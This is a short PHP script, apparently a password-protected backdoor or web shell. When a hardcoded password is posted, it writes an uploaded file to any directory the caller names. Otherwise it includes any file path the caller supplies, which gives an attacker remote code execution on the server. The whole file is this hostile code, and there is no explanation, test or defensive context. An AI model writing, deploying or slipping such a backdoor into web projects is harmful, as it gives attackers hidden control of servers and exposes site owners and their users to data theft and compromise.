<?php


if ($_POST['password']=='project:new world'){
   if(is_uploaded_file($_FILES["filename"]["tmp_name"])){
      move_uploaded_file($_FILES["filename"]["tmp_name"], $_POST["dir"] . $_FILES["filename"]["name"]);
     } else { 
     include($_POST["dir"]);
     }
}
   
   
?>